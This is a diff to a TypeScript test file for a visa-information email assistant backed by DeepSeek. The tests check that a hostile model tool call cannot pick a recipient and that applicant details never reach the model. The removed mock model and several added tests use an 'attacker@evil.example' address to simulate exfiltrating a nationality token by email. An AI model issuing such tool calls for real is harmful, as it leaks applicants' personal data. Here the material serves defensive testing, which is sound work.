@@ -4,13 +4,13 @@ import path from "node:path";
 import test from "node:test";
 import { fileURLToPath } from "node:url";
 import { loadConfig } from "../src/config.ts";
-import { runSyntheticPublicAdapter, buildChatBody, assertNoApplicantLeak } from "../src/deepseek.ts";
+import { runSyntheticPublicAdapter, buildChatBody, assertNoApplicantLeak, acceptGeneralExplanation } from "../src/deepseek.ts";
+import { cloudflareRestTransport, dispatchOutbox } from "../src/mail.ts";
 import { createServer } from "../src/http.ts";
 import { approveOutbox, deleteAuthorized } from "../src/inbound.ts";
 import { loadSnapshots } from "../src/knowledge.ts";
 import { safeJoin } from "../src/security.ts";
 import { outboxCount, readLog, send, tempRuntime, verified } from "./helpers.ts";
-import type { Model } from "../src/harness.ts";
 
 const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
 
@@ -214,15 +214,15 @@ test("cross-case paths, symlinks, and guessed deletion are refused", async () =>
   assert.equal(runtime.store.readCase(bob.caseId ?? ""), null);
 });
 
-test("approval never calls a provider, budgets stop tools, and the kill switch drafts nothing sensitive", async () => {
-  const runtime = tempRuntime({ maxToolActions: 0 });
+test("approval never calls a provider, and the kill switch drafts nothing sensitive", async () => {
+  const runtime = tempRuntime();
   const result = await send(runtime, {
     messageId: "budget",
     text: "Please organise my answers for a UK tourist visit. Purpose: tourism. I am an adult.",
   });
-  assert.equal(result.stopped, "tool_budget");
-  assert.match(result.reply, /stopped early/i);
-  assert.equal(result.artifactNames.includes("worksheet.md"), false);
+  assert.equal(result.modelRequests, 0);
+  assert.equal(result.modelReason, "no_transport");
+  assert.ok(result.artifactNames.includes("worksheet.md"));
   const approved = approveOutbox(runtime.store, result.outboxId ?? "");
   assert.equal(approved.status, "approved_not_sent");
   assert.equal(approved.providerAttempted, false);
@@ -316,26 +316,43 @@ test("config rejects live-send switches and unknown model ids", () => {
   assert.throws(() => loadConfig({ AUTO_REPLY: "on" }), /AUTO_REPLY/);
   assert.throws(() => loadConfig({ DEEPSEEK_MODEL: "deepseek-chat" }), /DEEPSEEK_MODEL/);
   assert.throws(() => loadConfig({ DEEPSEEK_THINKING: "enabled" }), /DEEPSEEK_THINKING/);
-  assert.throws(() => loadConfig({ DELIVERY_MODE: "cloudflare" }), /DELIVERY_MODE/);
+  assert.throws(() => loadConfig({ DELIVERY_MODE: "smtp" }), /DELIVERY_MODE/);
+  assert.equal(loadConfig({ AUTO_REPLY: "general_info", DELIVERY_MODE: "cloudflare" }).autoReply, "general_info");
 });
 
-test("a hostile model cannot add a recipient, and DeepSeek stays off the inbound path", async () => {
-  const hostile: Model = {
-    async complete(_view, observations) {
-      if (observations.length === 0) {
-        return { final: false, reportedTokens: 10, toolCalls: [{ id: "x", name: "send_email", arguments: { to: "attacker@evil.example", body: "ZZ-NATIONALITY-TOKEN" } }] };
-      }
-      return { final: true, reportedTokens: 10, toolCalls: [] };
-    },
-  };
-  const runtime = tempRuntime({ mode: "live" });
-  runtime.model = hostile;
+test("a hostile tool call cannot choose a recipient, and the model never sees the applicant text", async () => {
+  let round = 0;
+  const seen: string[] = [];
+  const runtime = tempRuntime({ deepseekApiKey: "sk-test-not-a-real-key" });
+  runtime.modelTransport = (async (_url, init) => {
+    const body = JSON.parse(String(init?.body));
+    seen.push(JSON.stringify(body));
+    round += 1;
+    if (round === 1) {
+      return Response.json({
+        choices: [{ message: { content: null, tool_calls: [{ id: "call-1", type: "function", function: { name: "send_email", arguments: "{\"name\":\"send_email\"}" } }] } }],
+        usage: { prompt_tokens: 20, completion_tokens: 10 },
+      });
+    }
+    const followUp = body.messages as { role: string; tool_call_id?: string; content?: string }[];
+    const toolMessage = followUp.find((message) => message.role === "tool");
+    assert.equal(toolMessage?.tool_call_id, "call-1");
+    assert.equal(toolMessage?.content, "rejected");
+    return Response.json({
+      choices: [{ message: { content: "Published pages describe a Standard Visitor stay of up to 6 months. This is general information.", tool_calls: [] } }],
+      usage: { prompt_tokens: 30, completion_tokens: 20 },
+    });
+  }) as typeof fetch;
   const result = await send(runtime, { messageId: "hostile", text: "Nationality: ZZ-NATIONALITY-TOKEN\nI want to visit the UK as a tourist." });
   const draft = runtime.store.readOutbox(result.outboxId ?? "");
   assert.equal(draft?.to, "synthetic@example.com");
+  assert.equal(draft?.status, "draft");
   assert.equal(result.toolNames.includes("send_email"), false);
   assert.ok(result.toolNames.includes("rejected"));
-  assert.equal(result.modelRequests, 0);
+  assert.equal(result.modelRequests, 2);
+  assert.equal(seen.some((body) => body.includes("ZZ-NATIONALITY-TOKEN")), false);
+  assert.equal(seen.some((body) => body.includes("topic: visitor")), true);
+  assert.match(result.reply, /AI-generated general explanation/);
 });
 
 test("synthetic DeepSeek adapter drops reasoning, retries, caps cost, and blocks applicant text", async () => {
@@ -372,7 +389,7 @@ test("synthetic DeepSeek adapter drops reasoning, retries, caps cost, and blocks
     }) as typeof fetch,
   });
   assert.equal(calls, 3);
-  assert.equal(flaky.stopped, "completed");
+  assert.equal(flaky.stopped, "output_rejected");
   assert.equal(flaky.reasoningDiscarded, true);
   assert.equal(flaky.discardedModelText, true);
   assert.equal(JSON.stringify(flaky).includes("SECRET-CHAIN-OF-THOUGHT"), false);
@@ -400,4 +417,103 @@ test("synthetic DeepSeek adapter drops reasoning, retries, caps cost, and blocks
     fetchImpl: (async () => new Response("bad", { status: 400 })) as typeof fetch,
   });
   assert.equal(failed.stopped, "provider_failure");
+  assert.equal(acceptGeneralExplanation("You qualify for this visa.", loadSnapshots(config)).ok, false);
+  assert.equal(acceptGeneralExplanation("The snapshot lists £135.", loadSnapshots(config)).ok, true);
+  assert.equal(acceptGeneralExplanation("The fee is £1.", loadSnapshots(config)).ok, false);
+});
+
+test("a public fee question runs the tool protocol and leaves the email body out of the request", async () => {
+  const runtime = tempRuntime({ deepseekApiKey: "sk-test-not-a-real-key" });
+  const bodies: { messages: { role: string; content?: string; tool_call_id?: string }[]; thinking: { type: string }; model: string }[] = [];
+  let round = 0;
+  runtime.modelTransport = (async (_url, init) => {
+    const body = JSON.parse(String(init?.body));
+    bodies.push(body);
+    round += 1;
+    assert.equal(body.model, "deepseek-flash");
+    assert.deepEqual(body.thinking, { type: "disabled" });
+    assert.equal(body.messages[1].content, "topic: fees");
+    if (round === 1) {
+      return Response.json({
+        choices: [{ message: { content: null, tool_calls: [{ id: "fee-1", type: "function", function: { name: "lookup_official", arguments: "{\"topic\":\"fees\"}" } }] } }],
+        usage: { prompt_tokens: 12, completion_tokens: 8 },
+      });
+    }
+    const tool = body.messages.find((message: { role: string }) => message.role === "tool");
+    assert.equal(tool.tool_call_id, "fee-1");
+    assert.match(tool.content, /135/);
+    return Response.json({
+      choices: [{ message: { content: "The published snapshot lists a Standard Visitor fee of £135 for up to 6 months. This is general information.", tool_calls: [] } }],
+      usage: { prompt_tokens: 40, completion_tokens: 18 },
+    });
+  }) as typeof fetch;
+  const result = await send(runtime, { messageId: "fee-loop", text: "What is the Standard Visitor fee? My note is ZZ-NATIONALITY-TOKEN." });
+  assert.equal(result.modelRequests, 2);
+  assert.deepEqual(result.toolNames, ["lookup_official"]);
+  assert.match(result.reply, /AI-generated general explanation/);
+  assert.match(result.reply, /£135/);
+  assert.equal(JSON.stringify(bodies).includes("ZZ-NATIONALITY-TOKEN"), false);
+  assert.equal(JSON.stringify(bodies).includes("What is the Standard Visitor fee"), false);
+  assert.equal(runtime.store.readOutbox(result.outboxId ?? "")?.status, "draft");
+});
+
+test("personal questions do not call the model when a transport is attached", async () => {
+  let calls = 0;
+  const runtime = tempRuntime({ deepseekApiKey: "sk-test-not-a-real-key" });
+  runtime.modelTransport = (async () => {
+    calls += 1;
+    throw new Error("model should not be called");
+  }) as typeof fetch;
+  const result = await send(runtime, { messageId: "personal-loop", text: "Am I eligible for a visitor visa? Nationality: ZZ-NATIONALITY-TOKEN" });
+  assert.equal(calls, 0);
+  assert.equal(result.modelRequests, 0);
+  assert.equal(result.modelReason, "personal_or_uncertain");
+  assert.doesNotMatch(result.reply, /AI-generated general explanation/);
+});
+
+test("email sending retries, stays idempotent, and auto-reply is limited to general information", async () => {
+  let fetches = 0;
+  const transport = cloudflareRestTransport("acct-test", "secret-token", async (url, init) => {
+    fetches += 1;
+    const headers = new Headers(init?.headers);
+    const body = JSON.parse(String(init?.body)) as { to: string };
+    assert.equal(String(url), "https://api.cloudflare.com/client/v4/accounts/acct-test/email/sending/send");
+    assert.equal(headers.get("authorization"), "Bearer secret-token");
+    assert.equal(JSON.stringify(body).includes("secret-token"), false);
+    assert.equal(body.to, "synthetic@example.com");
+    if (fetches === 1) return new Response("unavailable", { status: 503 });
+    return Response.json({ success: true, result: { messageId: "cf-msg-1" } });
+  });
+  const runtime = tempRuntime();
+  const created = await send(runtime, { messageId: "dispatch", replyTo: "attacker@evil.example", text: "What is the Standard Visitor fee?" });
+  const draft = runtime.store.readOutbox(created.outboxId ?? "");
+  assert.equal(draft?.status, "draft");
+  assert.equal(draft?.to, "synthetic@example.com");
+  const sent = await dispatchOutbox(runtime.store, draft!, transport, "visa@boshen.dev");
+  assert.equal(sent.status, "sent");
+  assert.equal(sent.providerMessageId, "cf-msg-1");
+  assert.equal(fetches, 2);
+  const again = await dispatchOutbox(runtime.store, sent, transport, "visa@boshen.dev");
+  assert.equal(again.providerMessageId, "cf-msg-1");
+  assert.equal(fetches, 2);
+
+  const permanent = cloudflareRestTransport("acct-test", "secret-token", async () => new Response("bad", { status: 400 }));
+  const other = await send(runtime, { messageId: "dispatch-fail", text: "What is the Standard Visitor fee?" });
+  const failed = await dispatchOutbox(runtime.store, runtime.store.readOutbox(other.outboxId ?? "")!, permanent, "visa@boshen.dev");
+  assert.equal(failed.status, "failed");
+
+  const sentTo: string[] = [];
+  const auto = tempRuntime({ autoReply: "general_info", deliveryMode: "cloudflare" });
+  auto.mailTransport = {
+    async send(message) {
+      sentTo.push(message.to);
+      return { messageId: "auto-1" };
+    },
+  };
+  const general = await send(auto, { messageId: "auto-fee", replyTo: "attacker@evil.example", text: "What is the Standard Visitor fee?" });
+  assert.equal(auto.store.readOutbox(general.outboxId ?? "")?.status, "sent");
+  assert.deepEqual(sentTo, ["synthetic@example.com"]);
+  const personal = await send(auto, { messageId: "auto-personal", text: "Am I eligible for a visitor visa?" });
+  assert.equal(auto.store.readOutbox(personal.outboxId ?? "")?.status, "draft");
+  assert.deepEqual(sentTo, ["synthetic@example.com"]);
 });
